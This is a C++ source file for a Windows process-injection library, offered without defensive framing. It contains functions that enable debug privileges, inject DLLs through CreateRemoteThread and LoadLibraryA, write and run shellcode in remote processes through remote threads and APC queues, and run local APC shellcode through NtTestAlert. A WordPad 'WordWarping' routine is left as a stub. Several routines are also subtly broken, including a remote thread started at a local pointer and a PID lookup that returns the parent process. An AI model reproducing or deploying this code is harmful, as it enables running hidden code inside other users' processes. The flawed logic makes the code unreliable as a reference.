#include "ProcessInject.h"
typedef NTSTATUS (NTAPI *NtTestAlert)();
LPVOID Inject::Memory_Surviliance::RemoteDataSection( HANDLE hprocess,DWORD pointers) {
	return NULL;
}
LPVOID Inject::Memory_Surviliance::GetRemoteModule(DWORD pid, const wchar_t *RemoteModule) {
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
	MODULEENTRY32 search_module;
	LPVOID found = NULL;
	if (hSnapShot == INVALID_HANDLE_VALUE)
		return NULL;
	search_module.dwSize = sizeof(MODULEENTRY32);
	if (Module32First(hSnapShot, &search_module)) {
		do {
			if (search_module.th32ProcessID == pid) {
				found = search_module.modBaseAddr;
				break;
			}

		} while (Module32NextW(hSnapShot, &search_module));
	}

	CloseHandle(hSnapShot);
	return found;
}
LPVOID Inject::Memory_Surviliance::GetProcessBase(HANDLE ProcHandle) {
	PROCESS_BASIC_INFORMATION pbi;
	NtQueryInformationProcess(ProcHandle, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	DWORD peb = (DWORD)pbi.PebBaseAddress+8;
	LPVOID img_base = NULL;
	ReadProcessMemory(ProcHandle, (LPCVOID)peb, &img_base, 4, NULL);
	return img_base;
}
IMAGE_SECTION_HEADER Inject::Memory_Surviliance::DataSection(LPVOID module, DWORD pointers) {
	BOOL bfound = FALSE;
	PIMAGE_DOS_HEADER DosHead = (PIMAGE_DOS_HEADER)module;
	PIMAGE_NT_HEADERS NtHead = (PIMAGE_NT_HEADERS)((DWORD)module + DosHead->e_lfanew);
	PIMAGE_SECTION_HEADER Sections = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(NtHead);
	IMAGE_SECTION_HEADER required_section;
	for (int i = 0; i < NtHead->FileHeader.NumberOfSections; i++) {
		if (!memcmp(Sections[i].Name, ".data", 5)){
			pointers = Sections[i].Misc.VirtualSize / sizeof(ULONG_PTR);
			bfound = TRUE;
			required_section = Sections[i];
			return required_section;
		}
		
	}
	
	
}
BOOL Inject::Memory_Surviliance::IsRWX(LPVOID ptr, BOOL Heap) {
	MEMORY_BASIC_INFORMATION mbi;
	DWORD                    res;

	if (ptr == NULL) return FALSE;

	// query the pointer
	res = VirtualQuery(ptr, &mbi, sizeof(mbi));
	if (res != sizeof(mbi)) return FALSE;
	if (Heap == TRUE) {
		return ((mbi.State == MEM_COMMIT) &&
			(mbi.Type == MEM_PRIVATE) &&
			(mbi.Protect == PAGE_EXECUTE_READWRITE));
	}
	else {
		return ((mbi.State == MEM_COMMIT) &&
			(mbi.Type == MEM_IMAGE) &&
			(mbi.Protect == PAGE_EXECUTE_READWRITE));

	}
}
BOOL Inject::Memory_Surviliance::IsHeapPtr(LPVOID ptr) {
	MEMORY_BASIC_INFORMATION mbi;
	DWORD                    res;

	if (ptr == NULL) return FALSE;

	// query the pointer
	res = VirtualQuery(ptr, &mbi, sizeof(mbi));
	if (res != sizeof(mbi)) return FALSE;

	return ((mbi.State == MEM_COMMIT) &&
		(mbi.Type == MEM_PRIVATE) &&
		(mbi.Protect == PAGE_READWRITE));
}
BOOL Inject::Memory_Surviliance::IsCodePtr(HANDLE hp, LPVOID ptr) {
	MEMORY_BASIC_INFORMATION mbi;
	DWORD res;
	if (ptr == NULL)return FALSE;
	res = VirtualQueryEx(hp, ptr, &mbi, sizeof(mbi));
	if (res != sizeof(mbi))return FALSE;

	return ((mbi.State == MEM_COMMIT) &&
		(mbi.Type == MEM_IMAGE) &&
		(mbi.Protect == PAGE_EXECUTE_READ));

}
HANDLE Inject::GetHandle(DWORD pid) {
	HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
	return hProc;
}
DWORD Inject::GetPidByName(WCHAR *proc_name) {
	HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 proc;
	ZeroMemory(&proc, sizeof(proc));
	proc.dwSize = sizeof(proc);
	if (Process32First(hsnapshot, &proc)) {
		do {
			if (!wcscmp(proc.szExeFile, proc_name)) // can't be helped it's  unicode only
			{
				return proc.th32ParentProcessID;
				break;
			}
		} while (Process32Next(hsnapshot,&proc));
	}
	CloseHandle(hsnapshot);
	return NULL;
}
BOOL Inject::SeDbugPrivs(){
BOOL bRet = FALSE;
HANDLE hToken = NULL;
LUID luid = { 0 };

if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
{
	if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		TOKEN_PRIVILEGES tokenPriv = { 0 };
		tokenPriv.PrivilegeCount = 1;
		tokenPriv.Privileges[0].Luid = luid;
		tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	}
}

return bRet;
}
BOOL Inject::DllInject::RemoteThreadDllInject(DWORD pid, char *dllPath){
	HANDLE prochandle = OpenProcess(PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ, FALSE, pid);
	LPVOID library_addr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	LPVOID lp_space = (LPVOID)VirtualAllocEx(prochandle, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(prochandle, lp_space, dllPath, strlen(dllPath), NULL);
	HANDLE hThread = CreateRemoteThread(prochandle, NULL, 0, (LPTHREAD_START_ROUTINE)library_addr, lp_space, NULL, NULL);
	
	
	return TRUE;
}
BOOL Inject::CodeInject::RemoteThreadShellcodeInject(DWORD pid,unsigned char *shellcode,DWORD size) {
	HANDLE porchandle = OpenProcess(PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ, FALSE, pid);
	LPVOID remotebuff = VirtualAllocEx(porchandle, NULL,size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(porchandle, remotebuff, shellcode, size, NULL);
	HANDLE RemoteThread = CreateRemoteThread(porchandle, NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
	return TRUE;
}
BOOL Inject::CodeInject::LocalAPCQueInjection(unsigned char * shellcode,DWORD size) {
	NtTestAlert NtAlert;
	NtAlert=(NtTestAlert)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtTestAlert");
	LPVOID lpsz = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(lpsz, shellcode, size);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)lpsz;
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
	NtAlert();
	return TRUE;
}
BOOL Inject::CodeInject::ApcQueInjection(DWORD pid, unsigned char *shellcode, DWORD size) {
	HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
	LPVOID alloced_mem = VirtualAllocEx(hProc, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProc, alloced_mem, shellcode, size, NULL);
	PTHREAD_START_ROUTINE apc_routiune = (PTHREAD_START_ROUTINE)alloced_mem;
	QueueUserAPC((PAPCFUNC)apc_routiune, hProc, NULL);
	ResumeThread(hProc);
	return TRUE;
}
BOOL Inject::CodeInject::WordWarping(LPVOID payload, DWORD payload_size) {
	HANDLE hp;
	DWORD id;
	HWND wpw, rew;
	LPVOID cs, wwf;
	SIZE_T rd, wr;
	INPUT ip;
	wpw = FindWindow(L"WordPadClass", NULL);
	rew = FindWindowExW(wpw ,NULL,L"RICHEDIT50W",NULL);
	return true;

}